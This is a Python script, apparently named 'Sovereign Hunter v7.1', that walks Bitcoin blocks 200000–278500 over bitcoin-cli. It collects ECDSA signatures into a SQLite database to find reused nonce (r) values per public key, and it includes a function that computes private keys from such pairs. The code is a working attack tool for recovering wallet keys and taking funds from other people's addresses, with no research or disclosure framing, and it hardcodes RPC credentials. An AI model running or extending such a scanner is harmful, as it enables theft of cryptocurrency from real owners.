import subprocess
import json
import sqlite3
import hashlib
import os
import time
from concurrent.futures import ProcessPoolExecutor

# --- CONFIGURATION ---
# Current Time: 2:15 AM CDT, Tuesday, June 9, 2026
# Optimized for M2 Multi-core with WAL-mode for database stability
RPC_USER = "ace"
RPC_PASS = "browser"
WORKERS = 6       # Slightly reduced to 6 to prevent I/O bottlenecks on M2
BATCH_SIZE = 50   
TARGET_START = 200000 
TARGET_END = 278500   
DB_FILE = "sigs_database-nw.db"
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# --- MATH ENGINE ---
def inverse(a, n):
    return pow(a, n - 2, n)

def calculate_privkey(r, s1, s2, z1, z2):
    try:
        k = ((z1 - z2) * inverse(s1 - s2, N)) % N
        privkey = ((s1 * k - z1) * inverse(r, N)) % N
        return hex(privkey)[2:].zfill(64)
    except:
        return None

# --- RPC INTERFACE ---
def call_cli(command):
    cmd = ["bitcoin-cli", f"-rpcuser={RPC_USER}", f"-rpcpassword={RPC_PASS}", *command]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            raw = result.stdout.strip()
            start = raw.find('{'); end = raw.rfind('}') + 1
            if start != -1 and end != 0:
                return json.loads(raw[start:end])
            return raw 
    except:
        pass
    return None

# --- CORE ANALYSIS ---
def extract_r_s_pub(vin):
    asm = vin.get('scriptSig', {}).get('asm', '')
    if "304" not in asm: return None, None, None
    parts = asm.split(" ")
    if len(parts) < 2: return None, None, None
    
    sig, pub = parts[0], parts[1]
    if sig.startswith("30") and len(sig) > 70:
        try:
            r_len = int(sig[6:8], 16) * 2
            r = int(sig[8:8+r_len], 16)
            s_marker = 8 + r_len
            s_len = int(sig[s_marker+2:s_marker+4], 16) * 2
            s = int(sig[s_marker+4:s_marker+4+s_len], 16)
            return r, s, pub
        except: pass
    return None, None, None

def scan_worker(start, end):
    # Added timeout=60 to handle M2 concurrency
    conn = sqlite3.connect(DB_FILE, timeout=60)
    cursor = conn.cursor()
    local_hits = []
    
    for height in range(start, end + 1):
        block_hash = call_cli(["getblockhash", str(height)])
        block = call_cli(["getblock", block_hash, "2"])
        if not block: continue
        
        for tx in block['tx']:
            for vin in tx.get('vin', []):
                r, s, pub = extract_r_s_pub(vin)
                if r:
                    cursor.execute("SELECT s_val, txid FROM signatures WHERE r_value=? AND pubkey=?", (str(r), pub))
                    match = cursor.fetchone()
                    
                    if match and match[1] != tx['txid']:
                        local_hits.append({
                            'r': hex(r), 'pub': pub, 'tx1': match[1], 'tx2': tx['txid'],
                            's1': match[0], 's2': str(s), 'height': height
                        })
                    else:
                        cursor.execute("INSERT OR IGNORE INTO signatures (r_value, s_val, pubkey, txid, block_height) VALUES (?, ?, ?, ?, ?)", 
                                       (str(r), str(s), pub, tx['txid'], height))
        
        # Reduced commit frequency to decrease lock contention
        if height % 20 == 0: 
            try:
                conn.commit()
            except sqlite3.OperationalError:
                time.sleep(1) # Wait if locked
                conn.commit()

    conn.close()
    return local_hits, end

# --- INITIALIZATION ---
def init_db():
    conn = sqlite3.connect(DB_FILE)
    # Enable WAL mode for high-concurrency multi-core writing
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute("""CREATE TABLE IF NOT EXISTS signatures (
                    r_value TEXT, 
                    s_val TEXT, 
                    pubkey TEXT, 
                    txid TEXT, 
                    block_height INTEGER)""")
    conn.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_sig ON signatures(r_value, pubkey, txid)")
    conn.execute("CREATE TABLE IF NOT EXISTS progress (last_block INTEGER)")
    res = conn.execute("SELECT MAX(last_block) FROM progress").fetchone()
    conn.close()
    return res[0] if res and res[0] else TARGET_START

if __name__ == "__main__":
    current = init_db()
    print(f"[{time.strftime('%H:%M:%S')}] Launching Sovereign Hunter v7.1 (WAL Enabled)")
    print(f"Target Era: 2012-2013 | Starting at Block {current}")
    
    while current < TARGET_END:
        with ProcessPoolExecutor(max_workers=WORKERS) as executor:
            tasks = []
            for i in range(WORKERS):
                b_start = current + (i * BATCH_SIZE)
                b_end = min(b_start + BATCH_SIZE - 1, TARGET_END)
                if b_start <= TARGET_END:
                    tasks.append(executor.submit(scan_worker, b_start, b_end))
            
            latest_b = current
            for future in tasks:
                try:
                    hits, last_b = future.result()
                    latest_b = max(latest_b, last_b)
                    if hits:
                        with open("hits_log.txt", "a") as f:
                            for h in hits:
                                print(f"\n[!!!] WEAK SIGNATURE MATCH: {h['pub'][:20]}...")
                                f.write(json.dumps(h) + "\n")
                except Exception as e:
                    print(f"Worker Error: {e}")
            
            current = latest_b + 1
            conn = sqlite3.connect(DB_FILE, timeout=60)
            conn.execute("INSERT INTO progress (last_block) VALUES (?)", (latest_b,))
            conn.commit()
            conn.close()
            print(f"[{time.strftime('%H:%M:%S')}] Progress: {latest_b}/{TARGET_END}")